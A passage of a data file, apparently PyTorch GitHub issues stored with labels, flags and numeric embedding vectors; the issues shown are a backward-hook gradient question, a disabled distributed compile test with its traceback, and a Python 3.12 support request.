  1.14726424e-01 -7.07392097e-02 -4.92250741e-01 -5.70052192e-02
  3.21524628e-02  2.72421092e-01 -1.77510455e-01  7.75965899e-02
  2.82081915e-03  3.27116549e-01  3.83686513e-01 -4.46037501e-02
  7.73966461e-02 -1.08402357e-01  1.02657452e-01  2.39250362e-01
  1.46964580e-01 -2.23946571e-02 -3.14596623e-01 -4.28675115e-03]"
Problem with backward hook function high priority module: docs module: autograd triaged,"Hi,

there is something strange in the `backward` step (or maybe something I don't understand). If I define a Module that takes 3 inputs, the `grad_input` has to be of size 3, right ? But this is not the case here (from the backward_hook point of view):

```import torch
from torch.autograd import Variable
import torch.nn as nn
import torch.nn.functional as F

def bh(m,go,gi):
    print(""Grad Input"")
    print(go)
    print(""Grad Output"")
    print(gi)

class M(nn.Module):
    def __init__(self):
        super(M,self).__init__()
        self.register_backward_hook(bh)


    def forward(self,x,y,z):
        return (x+y+z)

x=Variable(torch.randn(1,5),requires_grad=True)
y=Variable(torch.randn(1,5),requires_grad=True)
z=Variable(torch.randn(1,5),requires_grad=True)

criterion=nn.MSELoss()
mod=M()
out=mod(x,y,z)
loss=criterion(out,Variable(torch.randn(1,5)))
loss.backward()```

In that case, when I print grad_input throught the hook function, it is just composed of two elements... Could you tell me where am I wrong ? But `x.grad, y.grad and z.grad` seem correctly computed

cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen",True,"[-3.31573009e-01 -2.58724272e-01 -1.96300179e-01 -3.88171859e-02
 -2.32480653e-02 -1.10017598e-01 -7.95902237e-02  2.72210717e-01
 -4.04631227e-01 -2.62155067e-02 -1.09940693e-01  2.05071270e-02
 -1.91800863e-01  1.85875535e-01 -1.19467013e-01  4.74283360e-02
 -4.92480785e-01 -1.07907325e-01 -8.74683410e-02 -7.44053870e-02
  1.46812424e-01 -4.63682041e-02  2.96309162e-02  7.73192868e-02
  1.56604037e-01  2.82299221e-01 -1.40377149e-01 -2.05635786e-01
  3.26512098e-01  5.17415330e-02 -1.75174594e-01 -1.69056267e-01
 -2.92435884e-01  1.21542975e-01  2.13325724e-01 -6.03249017e-03
 -2.38620758e-01 -1.79348916e-01 -1.38398707e-01 -1.11078344e-01
  1.49153709e-01  1.69829875e-01 -1.01831332e-01  8.42943937e-02
 -8.42703134e-03  1.20703906e-01 -2.66185254e-01  1.29226208e-01
 -2.48466998e-01 -1.37057342e-02 -1.30415916e-01  8.37332234e-02
 -3.76448512e-01  1.83732390e-01  7.93518126e-02 -5.52341081e-02
 -4.03373502e-02  5.45770787e-02  2.91856945e-01 -1.97558224e-01
  1.76465884e-02 -8.66228789e-02  1.39958397e-01 -8.80251825e-02
  1.18136831e-01 -2.15690807e-01 -3.10534447e-01  2.02136099e-01
  1.95697516e-01  7.17979372e-02 -1.64918914e-01  3.15273739e-02
 -1.79683968e-01 -2.40678638e-01  2.25452334e-01 -1.33323342e-01
 -3.59669834e-01  2.68922091e-01 -2.65128791e-01 -1.59167469e-01
  1.49316385e-01  2.71942377e-01  3.82456481e-02  2.84118116e-01
  9.64219123e-02 -8.44114050e-02  1.60786629e-01 -8.89092833e-02
  1.06300920e-01  4.02551800e-01  2.11049497e-01 -2.48142481e-01
 -7.57901743e-03  6.77590013e-01 -1.92474499e-02  1.93683147e-01
  2.21714854e-01 -1.39371559e-01 -6.38545752e-02 -3.60787421e-01
  5.74818887e-02 -2.11699530e-01 -2.95477714e-02  2.25284249e-01
  1.87767714e-01  4.44281474e-03  2.36845911e-01  3.71603370e-01
  1.82364851e-01 -2.54992604e-01  1.32036269e-01  1.17832996e-01
  6.85718358e-02 -2.55990148e-01 -1.97764084e-01  3.78815159e-02
 -3.13917786e-01 -3.05852592e-01 -6.93204552e-02  7.41410777e-02
 -1.65109098e-01  4.28325832e-01  7.53612220e-02  2.13831484e-01
  2.85846680e-01 -2.13053375e-02  2.19441652e-01 -8.37790370e-02
 -1.39303237e-01  6.44365400e-02  9.61336493e-02  1.76007241e-01
 -9.30320174e-02 -9.48030576e-02  4.84716535e-01  4.53616500e-01
 -4.96885002e-01 -1.26498610e-01 -2.57386327e-01 -1.32509276e-01
 -2.17608303e-01  2.47892573e-01 -2.52346903e-01 -1.32345319e-01
  1.20712265e-01 -2.05188170e-02 -2.34034300e-01  1.14874102e-01
  1.21469714e-01 -4.30671163e-02  1.41430587e-01 -3.99429142e-01
 -6.12992167e-01  3.55477333e-01  1.60685420e-01  2.97883749e-02
  1.00559212e-01  4.79750261e-02  2.86523044e-01 -2.40199566e-01
  9.02089924e-02  6.95568845e-02  5.51526658e-02 -7.40858614e-02
  1.69163674e-01  5.16960993e-02 -1.85723811e-01  1.00558877e-01
 -5.13006330e-01  1.97870612e-01  1.18183509e-01 -1.38891876e-01
  6.94720587e-03  2.59120092e-02  3.57085764e-01 -2.01810092e-01
 -1.76981002e-01 -1.17136724e-01 -1.44786596e-01  2.59855479e-01
  3.02560091e-01  4.23300743e-01  2.32123598e-01  6.13980293e-02
  2.01725647e-01  2.53996968e-01  3.27547252e-01  4.30007800e-02
 -1.87227815e-01  1.38115138e-01 -1.53421193e-01  1.79289356e-02
  1.80180054e-02  1.37059495e-01 -1.05891436e-01  5.69397248e-02
  1.28763974e-01  1.50302187e-01  2.45829988e-02 -1.51225805e-01
 -1.43186867e-01  1.65989280e-01  1.62908897e-01  5.15200943e-02
 -2.23583356e-02 -4.21478264e-02 -2.39973605e-01 -3.24081749e-01
 -4.47480947e-01  1.74863040e-01 -1.54068440e-01 -2.65172899e-01
 -1.85304135e-01 -3.53217214e-01 -8.44898373e-02  2.92739049e-02
  7.48230442e-02 -9.66411605e-02 -6.13640510e-02  1.43473828e-02
  1.98877230e-01  4.41783853e-02  7.00920746e-02 -2.10540205e-01
  2.80536741e-01  1.61572665e-01 -1.81960374e-01 -1.12855501e-01
 -6.39324859e-02  1.62753791e-01 -1.39349058e-01 -3.22497964e-01
  2.48486102e-01  2.13484794e-01 -6.78768381e-02  5.10610878e-01
  4.16086577e-02  3.18176560e-02  1.78627104e-01  2.19475031e-01
 -1.86352115e-02 -2.07424313e-01  2.46546175e-02  2.11706646e-02
 -1.52876213e-01  2.27210112e-02 -2.28483707e-01  9.21134427e-02
 -1.18567511e-01 -6.69411570e-02 -1.72905531e-02  1.61340274e-03
 -7.79983327e-02 -4.60569784e-02  3.66645098e-01 -8.62373784e-02
  2.79060714e-02  2.47251336e-02 -7.61795044e-02 -4.54147756e-02
  5.66479601e-02  2.43563548e-01 -9.71439853e-02  2.88487583e-01
  2.95308769e-01 -1.41986459e-01 -1.11612074e-01 -1.10385269e-02
 -2.31355846e-01  6.77508563e-02  1.46393865e-01 -2.55250961e-01
  4.21034694e-01  5.09433746e-01  2.14951709e-02 -2.77963221e-01
  2.83844173e-01 -1.18848912e-01  2.01689616e-01 -1.92997828e-01
  4.15791422e-02  2.66107619e-01 -1.51328802e-01  2.22967863e-01
  4.18127418e-01 -2.79214948e-01  4.23341691e-02 -2.93360531e-01
 -2.21865267e-01 -3.32622305e-02 -2.74347607e-04 -1.94935158e-01
  3.44247341e-01 -8.39064419e-02 -4.78794910e-02  1.90237105e-01
  3.13880533e-01 -2.85968900e-01  1.14329576e-01  1.31254628e-01
 -6.61085844e-02  3.54412109e-01  7.99037367e-02 -1.23162970e-01
 -7.10370243e-02  5.23574576e-02 -2.80991104e-02  3.29331100e-01
  2.63969243e-01 -3.26485485e-01  1.77732363e-01 -1.10234134e-03
 -3.41284096e-01 -4.90884557e-02  7.10881222e-03  1.42017528e-01
  1.47836298e-01 -4.24502697e-03  4.97629168e-03  2.45062299e-02
 -2.78202593e-01 -1.47785142e-01 -3.37701499e-01  3.12861204e-01
 -2.77508378e-01 -8.85166526e-02 -3.04026663e-01  3.80326152e-01
 -2.23988682e-01  2.97209948e-01  6.25986792e-03  6.75326288e-02
  2.89716601e-01  1.45839900e-01 -9.15071219e-02 -3.69864970e-01
 -8.17133635e-02  3.01951408e-01 -4.83323261e-02 -2.53748298e-01
 -1.55114204e-01 -1.58239588e-01  1.83450937e-01 -3.50824334e-02
 -1.58929735e-01 -2.27008387e-01  3.21468085e-01  2.63004154e-01
 -5.80946263e-03 -2.08906516e-01  8.54885504e-02 -8.66446272e-03
 -1.28611013e-01  2.52939492e-01  1.93005279e-02  2.50371248e-01
  1.72659606e-01  2.11064368e-01 -7.31962323e-02  2.24286526e-01
 -1.94963455e-01 -1.42749488e-01 -2.53886849e-01 -4.08618867e-01
 -1.89991787e-01  1.10537067e-01 -2.34240234e-01  8.86139832e-03
  8.15320462e-02  2.01474354e-01  1.19031496e-01  7.35964701e-02
 -1.33705527e-01  7.69994333e-02  4.14278567e-01 -3.45033258e-02
 -9.15526897e-02 -1.48745015e-01 -7.36678839e-02 -2.81960428e-01
 -5.08435667e-02  3.61770570e-01 -2.14662999e-02 -2.02871650e-01]"
DISABLED test_2d_fsdp_tp_ac_compile (__main__.TestDTensorCompileE2E) skipped,"Platforms: linux

Broken on multigpu

To reenable on your PR, put `Fixes #<this issue number>` in the PR body and add the `ciflow/periodic` tag to trigger multigpu

Probably caused by #113547 or something in its stack @wanchaol  do you mind providing a forward fix?  

First known bad: https://hud.pytorch.org/pytorch/pytorch/commit/93372455a73043332c16a71cb9dccdf3e0412a57
Last known good: https://hud.pytorch.org/pytorch/pytorch/commit/a1e3c501652101e8b37baac62216db7ca22c9923

Ex. https://github.com/pytorch/pytorch/actions/runs/6863856295/job/18665805628
```
_______________ TestDTensorCompileE2E.test_2d_fsdp_tp_ac_compile _______________
Traceback (most recent call last):
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 542, in wrapper
    self._join_processes(fn)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 761, in _join_processes
    self._check_return_codes(elapsed_time)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 811, in _check_return_codes
    raise RuntimeError(error)
RuntimeError: Process 2 exited with error code 10 and exception:
Traceback (most recent call last):
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 658, in run_test
    getattr(self, test_name)()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 544, in wrapper
    fn()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_utils.py"", line 2575, in wrapper
    method(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/distributed/_tensor/common_dtensor.py"", line 193, in wrapper
    func(self, *args, **kwargs)  # type: ignore[misc]
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 174, in wrapper
    return func(*args, **kwargs)
  File ""/var/lib/jenkins/workspace/test/distributed/_tensor/test_dtensor_compile.py"", line 328, in test_2d_fsdp_tp_ac_compile
    compiled_output = compiled_2d(inp)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/nn/modules/module.py"", line 1510, in _wrapped_call_impl
    return self._call_impl(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/nn/modules/module.py"", line 1519, in _call_impl
    return forward_call(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py"", line 408, in _fn
    return fn(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/external_utils.py"", line 17, in inner
    return fn(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/nn/modules/module.py"", line 1510, in _wrapped_call_impl
    return self._call_impl(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/nn/modules/module.py"", line 1519, in _call_impl
    return forward_call(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/fully_sharded_data_parallel.py"", line 840, in forward
    args, kwargs = _pre_forward(
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_runtime_utils.py"", line 412, in _pre_forward
    unshard_fn(state, handle)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_runtime_utils.py"", line 447, in _pre_forward_unshard
    _unshard(state, handle, state._unshard_stream, state._pre_unshard_stream)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_runtime_utils.py"", line 331, in _unshard
    handle.unshard()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_flat_param.py"", line 1272, in unshard
    self._use_unsharded_flat_param(padded_unsharded_flat_param)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_flat_param.py"", line 1404, in _use_unsharded_flat_param
    self._use_unsharded_views(
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_flat_param.py"", line 1847, in _use_unsharded_views
    views = self._get_unflat_views()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_flat_param.py"", line 1824, in _get_unflat_views_aligned
    _ext_post_unflatten_transform(
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_fsdp_extensions.py"", line 113, in _ext_post_unflatten_transform
    return fsdp_extension.post_unflatten_transform(tensor, param_extension)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/tensor/parallel/fsdp.py"", line 334, in post_unflatten_transform
    result = _unflatten_tensor(tensor, param_extension)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py"", line 569, in catch_errors
    return callback(frame, cache_entry, hooks, frame_state)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 671, in _convert_frame
    result = inner_convert(frame, cache_entry, hooks, frame_state)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 377, in _convert_frame_assert
    return _compile(
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 614, in _compile
    raise InternalTorchDynamoError(str(e)).with_traceback(
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 595, in _compile
    guarded_code = compile_inner(code, one_graph, hooks, transform)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/utils.py"", line 243, in time_wrapper
    r = func(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 512, in compile_inner
    out_code = transform_code_object(code, transform)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/bytecode_transformation.py"", line 1033, in transform_code_object
    transformations(instructions, code_options)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 150, in _fn
    return fn(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 477, in transform
    tracer.run()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 2120, in run
    super().run()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 815, in run
    and self.step()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 778, in step
    getattr(self, inst.opname)(inst)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 469, in wrapper
    return inner_fn(self, inst)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 1259, in CALL_FUNCTION_KW
    self.call_function(fn, args, kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 650, in call_function
    self.push(fn.call_function(self, args, kwargs))
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/variables/torch.py"", line 572, in call_function
    kwargs_as_value = {k: v.as_python_constant() for k, v in kwargs.items()}
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/variables/torch.py"", line 572, in <dictcomp>
    kwargs_as_value = {k: v.as_python_constant() for k, v in kwargs.items()}
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/variables/lists.py"", line 66, in as_python_constant
    return self.python_type()([x.as_python_constant() for x in self.items])
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/variables/lists.py"", line 66, in <listcomp>
    return self.python_type()([x.as_python_constant() for x in self.items])
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/variables/base.py"", line 238, in as_python_constant
    raise NotImplementedError(f""{self} is not a constant"")
torch._dynamo.exc.InternalTorchDynamoError: SymNodeVariable() is not a constant

from user code:
   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/tensor/parallel/_data_parallel_utils.py"", line 18, in _unflatten_tensor
    result = DistributedTensor.from_local(

Set TORCH_LOGS=""+dynamo"" and TORCHDYNAMO_VERBOSE=1 for more information


You can suppress this exception and fall back to eager by setting:
    import torch._dynamo
    torch._dynamo.config.suppress_errors = True


To execute this test, run the following from the base repo dir:
     python test/distributed/_tensor/test_dtensor_compile.py -k test_2d_fsdp_tp_ac_compile

This message can be suppressed by setting PYTORCH_PRINT_REPRO_ON_FAILURE=0


----------------------------- Captured stdout call -----------------------------
Process 2 terminated with exit code 10, terminating remaining processes.
------------------------------ Captured log call -------------------------------
INFO     numba.cuda.cudadrv.driver:driver.py:245 init
```

This test was disabled because it is failing on main branch ([recent examples](http://torch-ci.com/failure/distributed%2F_tensor%2Ftest_dtensor_compile.py%3A%3ATestDTensorCompileE2E%3A%3Atest_2d_fsdp_tp_ac_compile)).",False,"[-4.61387992e-01 -9.61354002e-02 -2.46426925e-01 -8.39451998e-02
 -7.43672997e-02 -3.68295640e-01 -1.84821427e-01  1.45686239e-01
 -4.60880518e-01 -1.88086927e-01  2.69138478e-02 -6.09342009e-02
  1.38873130e-01 -1.35743707e-01 -2.95970678e-01  4.58874181e-02
 -9.26814824e-02 -2.81697631e-01  7.56889507e-02  6.91970438e-03
 -1.41500831e-01  5.65676205e-02 -2.13233590e-01  1.41003668e-01
 -6.31408300e-03  1.49766371e-01  3.63152847e-03  1.13000087e-01
  3.58387828e-04  2.45634660e-01  4.04361546e-01  4.66034055e-01
 -1.19867764e-01  1.37398407e-01  1.05257183e-02  2.90817749e-02
 -3.37869197e-01 -1.88647419e-01 -2.94596739e-02 -1.46979496e-01
 -1.02356702e-01 -2.05868334e-01 -1.36454836e-01  1.26158029e-01
  7.65929371e-03 -2.05214009e-01 -9.56792384e-02  2.85338163e-01
 -1.51408508e-01 -2.58570105e-01  1.48489058e-01  1.83247432e-01
 -1.62998354e-03 -1.58232436e-01  1.47818387e-01 -2.43933603e-01
  5.06644025e-02  4.09973234e-01  1.85536295e-01  1.45594984e-01
  3.14617574e-01 -1.62069872e-01  2.03916475e-01  5.97122684e-02
  9.17256251e-03  1.73924655e-01  2.69953698e-01  4.01522480e-02
  2.27341324e-01  1.72224462e-01 -4.44169715e-03 -1.13714542e-02
 -3.29619586e-01 -2.93896794e-01  3.23169768e-01  3.00981760e-01
 -6.62731528e-01 -1.04676172e-01 -1.14355758e-01 -2.77997464e-01
  1.93628326e-01  1.57978535e-01 -3.98209691e-02 -7.10303262e-02
  5.20481169e-02 -1.57761604e-01  1.72994226e-01 -4.75904316e-01
  2.30055392e-01 -1.23997353e-01  3.19209546e-01  7.70868436e-02
 -4.34320047e-02  2.62312382e-01 -1.35927498e-01  6.49593771e-02
  2.95854378e-02 -1.98224455e-01 -1.27798349e-01  1.68693960e-02
  6.95558190e-02 -7.98200965e-02 -4.05619234e-01  1.92498118e-01
 -2.62793779e-01 -7.61781782e-02  2.25344867e-01  3.94835770e-01
 -2.10315138e-01 -7.26356059e-02  4.09684032e-02 -2.26839315e-02
 -1.40894175e-01 -4.77337316e-02  3.68839175e-01  2.35233411e-01
 -1.78268641e-01 -1.14720993e-01 -2.69528568e-01 -1.33775994e-01
 -2.83701003e-01 -4.29532751e-02 -1.29866213e-01 -1.04021415e-01
  2.78417408e-01 -3.11963260e-02  1.13673039e-01  9.54231173e-02
  4.61423993e-02 -1.15887880e-01 -1.03217661e-01  1.42505050e-01
  1.42054051e-01  7.54986703e-02  1.93295330e-01  3.67026925e-01
 -1.17612101e-01 -1.11675903e-01  2.09223509e-01  1.16992235e-01
 -1.88099481e-02  1.44710332e-01 -2.18916029e-01 -3.76873881e-01
  1.02646559e-01  6.32120669e-03 -4.49092925e-01  6.41183108e-02
  2.31567711e-01  3.06459144e-02  1.97939184e-02 -3.26342694e-02
 -2.98388392e-01  7.66929865e-01  9.74162668e-02  1.15886785e-01
  5.10142148e-01  6.78459927e-03  1.16896987e-01 -1.86478049e-01
  6.08933195e-02  2.43704244e-01 -2.07168043e-01  6.78226873e-02
  1.33099854e-01 -8.20708741e-03 -2.31365696e-01  4.93364558e-02
 -3.80966105e-02  2.22717617e-02 -8.95974562e-02 -2.30182588e-01
  2.99332887e-01  1.65827096e-01  1.20410234e-01 -5.22668213e-02
  1.91841125e-02 -1.66886121e-01  5.82882613e-02  3.74492317e-01
  4.25191633e-02  2.63264418e-01  2.42278844e-01  1.31580681e-01
 -2.02050395e-02  2.22589701e-01  1.87769294e-01  1.15759380e-01
 -1.72071129e-01 -1.28513426e-01 -4.26318407e-01  3.97777371e-02
 -1.72959119e-01 -1.20077603e-01 -1.59242362e-01  4.59828153e-02
  1.01435184e-01  2.54126400e-01  1.00733541e-01  3.03203985e-02
 -2.92001843e-01  1.90329671e-01  6.27980232e-02  2.98208091e-02
 -4.43343744e-02  1.14104234e-01 -2.61406451e-01 -2.95783162e-01
 -2.31078207e-01 -4.76377979e-02 -2.48223588e-01 -1.37982100e-01
 -7.33770505e-02 -2.70529836e-01 -1.60020068e-01  8.86912793e-02
 -1.65896401e-01 -6.58515841e-02 -8.42724591e-02  2.17009604e-01
  2.16961324e-01 -4.54241969e-02  1.77345313e-02 -3.38155270e-01
 -6.39675930e-03 -2.37180702e-02  4.42215800e-03  9.42173041e-03
 -1.42007712e-02  1.61344215e-01 -1.87986210e-01 -1.18433356e-01
  2.56303072e-01  2.08852161e-02  1.21002257e-01  8.37686099e-03
  4.60137092e-02 -2.75416553e-01 -1.22452155e-01  7.10422397e-02
 -2.00817257e-01 -2.47454077e-01 -2.78287143e-01  1.21325232e-01
  3.08955789e-01  1.52615875e-01 -1.07857004e-01  1.15681268e-01
  9.04105082e-02  2.46162310e-01  5.84480241e-02 -2.58681029e-01
  2.10782379e-01  2.25905389e-01  2.43657917e-01  1.43750668e-01
 -5.26870750e-02  1.75629973e-01  1.05997987e-01  4.72727567e-02
  7.01513588e-02  4.89156932e-01 -3.02644610e-01  2.70935535e-01
  1.03182770e-01  1.74079686e-01 -2.05580249e-01  2.17203096e-01
 -1.91493243e-01  1.10180207e-01  5.76377660e-02 -1.96628392e-01
  3.22140813e-01  9.15993154e-02  2.18633473e-01 -1.80062547e-01
  4.96679634e-01  5.08278497e-02  1.09006867e-01 -3.18786278e-02
 -3.48229632e-02  2.81547248e-01  8.02396685e-02  6.99834228e-02
  2.13159665e-01 -5.88391609e-02 -7.51234889e-02 -2.72064745e-01
 -3.61720026e-01 -2.08397597e-01  1.89889967e-02  8.00378099e-02
  3.71088624e-01  5.91272675e-02  1.40900370e-02  2.24604443e-01
  7.29080960e-02 -2.15058148e-01  3.17224383e-01 -6.21475726e-02
 -2.03637987e-01  6.86562583e-02 -7.26373345e-02 -1.43735766e-01
 -1.78178146e-01  2.52589304e-02 -9.91067886e-02  1.82070896e-01
  1.87237054e-01 -3.83801937e-01  3.08270872e-01  4.35712099e-01
  1.62184954e-01  1.93750709e-01 -1.58515707e-01  1.96308374e-01
 -3.29883993e-01  3.60454679e-01 -1.53082624e-01  2.37970911e-02
  1.81208730e-01  1.93851776e-02 -2.38787755e-01  1.51750222e-01
  2.21175522e-01 -3.02649587e-02 -4.04182583e-01  1.30517818e-02
 -2.50673771e-01  2.04713438e-02  1.35772049e-01 -2.22836472e-02
  4.82370853e-02 -5.52527048e-03 -2.01533675e-01 -2.94811130e-01
 -1.50687382e-01  1.71415582e-01  1.08078104e-02 -1.84050009e-01
 -3.10238600e-01 -1.25324726e-01  5.71694188e-02 -2.92328715e-01
 -1.19931310e-01  8.22969712e-03  2.26841152e-01  2.04481110e-01
 -4.05946113e-02 -3.76144648e-02 -2.81352457e-03 -2.10563213e-01
 -3.12482357e-01  5.25673572e-03  1.03769980e-01  4.04690921e-01
  1.15428912e-02  3.80328357e-01  1.85767651e-01  1.59544855e-01
 -3.87900770e-01  4.66302484e-02 -2.21672386e-01 -1.92038983e-01
 -5.58794886e-02 -1.55644894e-01 -2.01566637e-01  2.04432964e-01
  1.03534810e-01  1.38015330e-01 -4.14208651e-01  2.26002246e-01
 -2.82113254e-01  5.31424470e-02  3.14614236e-01 -1.94256827e-01
 -4.89706658e-02  1.08573079e-01 -9.05792937e-02 -2.59667844e-01
  4.76676486e-02 -3.48700508e-02  7.51713365e-02  7.12771118e-02]"
Please support Python 3.12.0 ,"### ðŸš€ The feature, motivation and pitch

Please support Python 3.12.0

### Alternatives

_No response_

### Additional context

_No response_",False,"[-0.13268884 -0.02024388 -0.0877292   0.03218897 -0.05422175  0.1929835
 -0.16492346 -0.22936548 -0.73872256 -0.04564212 -0.0991626  -0.29666832
 -0.18242897  0.27085483  0.22007747  0.28933093 -0.04439115  0.14433119
 -0.12959579 -0.20361532 -0.04211853 -0.12287708 -0.03044626 -0.2779922
  0.26004067 -0.15062593 -0.3041659   0.19729877  0.12272691  0.11056599
  0.24782634  0.1510706   0.12657876 -0.13648288 -0.0252509   0.29401055
 -0.39354247 -0.38849923 -0.40455115  0.01295353 -0.27781117  0.37282002
 -0.2104845  -0.13528822 -0.22067001 -0.19756733 -0.0386191  -0.05392073
 -0.03608473 -0.28104562  0.20140813  0.04715421 -0.3156256  -0.74760014
  0.08271328  0.14877315 -0.04170989  0.5432476  -0.08580312 -0.6426073
  0.17183462  0.10216914 -0.14065453  0.1454667  -0.09551352  0.32183295
 -0.2686595   0.22325858  0.3428709  -0.03817701  0.05781137 -0.09400905
 -0.47596005 -0.288597    0.05712036  0.05373183 -0.03114722  0.07381608
 -0.16187243 -0.32151073 -0.06345423 -0.23508708 -0.46754658 -0.08620848
  0.2678307   0.00513152  0.31473118 -0.18827356 -0.0550576   0.313462
  0.48071322 -0.14839038 -0.07232714  0.18519135  0.11127321  0.17958525
  0.0595654  -0.25934634 -0.3827402   0.05151514  0.1443329  -0.26639622
 -0.19845752 -0.02489356  0.0086182  -0.15765604  0.02476644 -0.19414261
  0.17197387  0.08318221 -0.01843455  0.11397339 -0.03217051 -0.35548523
 -0.0780268  -0.02092609 -0.38783482  0.14107662  0.08981691  0.46862936
  0.53265554  0.13015606  0.01704282  0.23005691  0.4081042  -0.02836989
 -0.5731663  -0.06940306 -0.23447634  0.06180117  0.42442033  0.3000147
 -0.24507684  0.26314145  0.10701305  0.15845674  0.06865679 -0.5219448
  0.00931779 -0.03378806 -0.05887624 -0.05251788 -0.1800649  -0.76333314
 -0.22550388  0.20576787 -0.25649038  0.4483907  -0.11592121 -0.27876523
  0.1100089   0.19304729 -0.58197117  0.27062017  0.30916804 -0.21202986
  0.15122406  0.06605529 -0.01177773 -0.09381285 -0.08907632  0.36519954
 -0.47426185 -0.69098806 -0.2995756   0.02322893 -0.12105906 -0.4195126
  0.10075476  0.06643049 -0.01993038 -0.1948086   0.29739252  0.03209074
  0.15891656  0.04993832 -0.26480755 -0.48519486  0.6212738   0.23830779
  0.18013218  0.26917204 -0.0683719  -0.24444784 -0.433663    0.49732608
 -0.12358993 -0.02740203  0.42525542 -0.041986   -0.14540923 -0.27740753
  0.3813627   0.0232137   0.01742033  0.02861128  0.15528923 -0.02893767
 -0.3020433   0.23695168 -0.22175765  0.39638874 -0.13451248 -0.17943285
  0.12152123 -0.15527588  0.12845136  0.09528236 -0.0158857  -0.08768593
 -0.30247566 -0.53072256  0.12034009 -0.24081355 -0.11814614 -0.06878398
  0.55934715  0.25373492 -0.32893628 -0.31531066 -0.18745925  0.372975
  0.07115618 -0.35057417  0.5036044   0.11608499 -0.19010091 -0.0896213
 -0.13572566  0.15864995  0.1760663  -0.42967525  0.6238753   0.42163274
  0.05268098 -0.07361785  0.08532429  0.183319   -0.11340553  0.16666463
 -0.40716282  0.35656115 -0.01683345  0.06556933  0.02889052  0.32196313
 -0.5678263  -0.37945345 -0.42363656 -0.07537953 -0.07719533  0.1491976
  0.41592184  0.12704371  0.41636416  0.51442194 -0.15296036  0.01870976
 -0.06188247  0.34896797  0.36093512  0.12600566 -0.13093607  0.25577593
  0.43932986  0.26919115  0.1452824   0.8034682   0.29532084 -0.06306325
  0.12988874 -0.63648224 -0.18360218  0.01138657  0.08139143  0.19790344
  0.43407986 -0.39115     0.25025487 -0.1604921  -0.04046684 -0.40936798
 -0.09994924  0.09517642 -0.10397661 -0.14486565  0.09802811 -0.13252686
 -0.00287984  0.36083832 -0.52193385  0.30843672  0.14370081 -0.17283298
 -0.46208107  0.16315866  0.19723625 -0.31276596 -0.02635956  0.41295174
